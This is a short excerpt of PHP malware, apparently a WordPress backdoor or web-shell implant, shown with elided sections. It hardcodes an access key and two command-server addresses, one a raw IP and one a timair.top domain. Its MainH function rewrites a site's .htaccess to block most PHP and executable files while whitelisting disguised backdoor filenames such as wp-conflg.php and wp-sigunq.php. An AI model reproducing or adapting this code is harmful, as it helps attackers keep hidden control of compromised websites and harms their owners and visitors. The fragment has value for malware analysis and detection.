...
define("KEY","k=IsuYw2FtvYLK7S");$SARR = explode(",","http://195.58.49.203,https://manage.timair.top");
...
function MainH(){
    ...
    if(strpos($J["h"],"<FilesMatch") === false){
        $h2 = "<FilesMatch \".(py|exe|phtml|php|PhP|php5|suspected)$\">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n<FilesMatch \"^(index.php|wp-login.php|wp-blog-header.php|style.php|style2.php|wp-conflg.php|index.php|class.api.php|iR7SzrsOUEP.php|license.php|wp-blog.php|moon.php|wp-add.php|plugin-install.php|admin.php|wp-sigunq.php|my1.php|wp-good.php|good.php";
